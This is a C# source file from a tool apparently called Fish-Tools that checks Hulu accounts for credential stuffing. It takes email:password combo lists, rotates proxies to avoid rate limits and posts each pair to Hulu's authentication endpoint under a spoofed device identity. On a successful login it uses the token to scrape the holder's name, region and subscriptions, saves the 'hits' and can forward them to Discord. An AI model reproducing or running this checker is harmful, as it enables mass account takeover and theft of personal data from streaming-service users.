/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Net.Http;
using System.Net;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class HuluAccountChecker : BaseAccountChecker
    {
        private List<string> Proxies { get; set; } = new List<string>();
        private Random Rand { get; set; } = new Random();
        private bool UseProxies { get; set; } = false;
        private bool EnableDetailedInfo { get; set; } = true;

        public HuluAccountChecker() : base("Hulu")
        {
            MaxRetries = 2;
            EnableRetry = true;
        }

        protected override void GetAdditionalSettings(Logger logger)
        {
            base.GetAdditionalSettings(logger);
            logger.Info("Use proxies? (y/n):");
            Console.Write("-> ");
            string useProxies = Console.ReadLine()?.ToLower();
            UseProxies = useProxies == "y" || useProxies == "yes";

            if (UseProxies)
            {
                logger.Info("Enter the path to your proxies file:");
                Console.Write("-> ");
                string proxiesPath = Console.ReadLine();

                if (!string.IsNullOrWhiteSpace(proxiesPath) && File.Exists(proxiesPath))
                {
                    Proxies.AddRange(File.ReadAllLines(proxiesPath).Where(p => !string.IsNullOrWhiteSpace(p)));
                    logger.Success($"Loaded {Proxies.Count} proxies");
                }
                else
                {
                    logger.Error("Invalid proxies file path. Proxies will be disabled.");
                    UseProxies = false;
                }
            }

            logger.Info("Enable detailed subscription information? (y/n):");
            Console.Write("-> ");
            string detailed = Console.ReadLine()?.ToLower();
            EnableDetailedInfo = detailed == "y" || detailed == "yes";
        }

        protected override async Task ProcessCombo(string combo, Logger logger)
        {
            var comboParts = ParseCombo(combo);
            if (comboParts == null)
            {
                logger.Error($"Invalid combo format: {combo}");
                SaveError(combo, "Invalid format");
                return;
            }

            string email = comboParts[0];
            string password = comboParts[1];

            await RetryOperation(async () =>
            {
                await CheckLogin(email, password, logger);
            }, combo, logger);
        }

        private string GetProxy()
        {
            if (!UseProxies || Proxies.Count == 0)
                return null;

            return Proxies[Rand.Next(0, Proxies.Count)];
        }

        private async Task CheckLogin(string email, string password, Logger logger)
        {
            try
            {
                // Use proxy for account checking
                var handler = new HttpClientHandler();
                string proxy = GetNextProxy();
                if (!string.IsNullOrEmpty(proxy))
                {
                    handler.Proxy = new System.Net.WebProxy(proxy);
                    handler.UseProxy = true;
                    logger.Info($"Using proxy: {proxy}");
                }
                using (var httpClient = new HttpClient(handler))
                {
                    httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

                    string postData = $"affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={password}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={email}";
                    var content = new StringContent(postData, Encoding.UTF8, "application/x-www-form-urlencoded");

                    var response = await httpClient.PostAsync("https://auth.hulu.com/v1/device/password/authenticate", content);
                    string responseText = await response.Content.ReadAsStringAsync();

                    if (responseText.Contains("user_token"))
                    {
                        string hitInfo = $"{email}:{password}";
                        string detailedInfo = hitInfo;

                        if (EnableDetailedInfo)
                        {
                            try
                            {
                                Match tokenMatch = Regex.Match(responseText, "user_token\":\"(.*?)\"");
                                httpClient.DefaultRequestHeaders.Add("Authorization", "Bearer " + tokenMatch.Groups[1].Value);

                                var userDetailsResponse = await httpClient.GetStringAsync("https://home.hulu.com/v1/users/self");
                                if (userDetailsResponse.Contains(",\"subscription\":{\"id\":"))
                                {
                                    Match nameMatch = Regex.Match(userDetailsResponse, "\"name\":\"(.*?)\"");
                                    Match birthdateMatch = Regex.Match(userDetailsResponse, "birthdate\":\"(.*?)\"");
                                    Match regionMatch = Regex.Match(userDetailsResponse, "region\":\"(.*?)\"");

                                    string packageDetails = "";
                                    if (userDetailsResponse.Contains("\"package_ids\":(.*?),\"cus"))
                                    {
                                        string packageIds = Regex.Match(userDetailsResponse, "\"package_ids\":(.*?),\"cus").Groups[1].Value;
                                        if (packageIds.Contains("[\"1\",\"2\"]")) packageDetails = "Hulu";
                                        if (packageIds.Contains("\"14\"")) packageDetails += " | Hulu (No Ads)";
                                        if (packageIds.Contains("\"15\"")) packageDetails += " | SHOWTIME®";
                                        if (packageIds.Contains("\"16\"")) packageDetails += " | Live TV";
                                        if (packageIds.Contains("\"17\"")) packageDetails += " | HBO®";
                                        if (packageIds.Contains("\"18\"")) packageDetails += " | CINEMAX®";
                                        if (packageIds.Contains("\"19\"")) packageDetails += " | STARZ®";
                                        if (packageIds.Contains("\"21\"")) packageDetails += " | Entertainment Add-On";
                                        if (packageIds.Contains("\"23\"")) packageDetails += " | Español Add-On";
                                        if (packageIds.Contains("\"25\",\"26\"")) packageDetails += " | Hulu, Disney+, and ESPN+";
                                        if (packageIds.Contains("\"17\",\"27\"")) packageDetails += " | HBO Max™";
                                    }

                                    detailedInfo = $"{email}:{password} | Username: {nameMatch.Groups[1].Value} | Region: {regionMatch.Groups[1].Value} | Plan: Premium | Subscription: {packageDetails}";
                                }
                            }
                            catch (Exception ex)
                            {
                                logger.Warn($"Failed to get detailed info for {email}: {ex.Message}");
                            }
                        }

                        // Send Discord notification (no proxy)
                        if (UsingDiscord)
                        {
                            try
                            {
                                await SendDiscordNotification(detailedInfo);
                            }
                            catch (Exception ex)
                            {
                                logger.Warn($"Failed to send Discord notification: {ex.Message}");
                            }
                        }

                        logger.Success($"[HIT] {detailedInfo}");
                        SaveHit(hitInfo, detailedInfo);
                    }
                    else
                    {
                        logger.Error($"[BAD] {email}:{password}");
                        SaveBad($"{email}:{password}", "Authentication failed");
                    }
                }
            }
            catch (Exception ex)
            {
                logger.Error($"[ERROR] {email}:{password} | {ex.Message}");
                SaveError($"{email}:{password}", ex.Message);
                throw; // Re-throw for retry mechanism
            }
        }

        protected override bool ShouldRetry(Exception ex)
        {
            return ex.Message.Contains("NetworkError") ||
                   ex.Message.Contains("Timeout") ||
                   ex.Message.Contains("ServiceUnavailable") ||
                   ex.Message.Contains("TooManyRequests") ||
                   ex.Message.Contains("Proxy") ||
                   ex.Message.Contains("Connection");
        }

        protected override void UpdateProgress(Logger logger)
        {
            if (ProcessedCombos % 10 == 0 || ProcessedCombos == TotalCombos)
            {
                var elapsed = DateTime.Now - StartTime;
                var rate = ProcessedCombos > 0 ? elapsed.TotalSeconds / ProcessedCombos : 0;
                var remaining = (TotalCombos - ProcessedCombos) * rate;
                var successRate = TotalCombos > 0 ? (double)Hits / TotalCombos * 100 : 0;
                
                Console.Title = $"Fish Tools | Hulu | Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Success: {successRate:F1}% | ETA: {TimeSpan.FromSeconds(remaining):mm\\:ss}";
                
                logger.Info($"Hulu Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Bads: {Bads} | Errors: {Errors} | Success: {successRate:F1}% | Rate: {rate:F2}s/combo");
            }
        }

        protected override void ShowFinalResults(Logger logger)
        {
            var elapsed = DateTime.Now - StartTime;
            
            Console.WriteLine();
            logger.Success("=== HULU ACCOUNT CHECKING COMPLETED ===");
            logger.Info($"Total combos: {TotalCombos}");
            logger.Info($"Hits: {Hits}");
            logger.Info($"Bads: {Bads}");
            logger.Info($"Errors: {Errors}");
            logger.Info($"Success rate: {(double)Hits / TotalCombos * 100:F2}%");
            logger.Info($"Total time: {elapsed:hh\\:mm\\:ss}");
            logger.Info($"Average rate: {elapsed.TotalSeconds / TotalCombos:F2}s/combo");
            logger.Info($"Hits saved to: {HitsFile}");
            logger.Info($"Detailed hits saved to: {HitsFileDetailed}");
            
            if (UseProxies)
                logger.Info($"Proxies used: {Proxies.Count}");
            
            if (UsingDiscord)
                logger.Info("Discord notifications were sent");
        }
    }
}
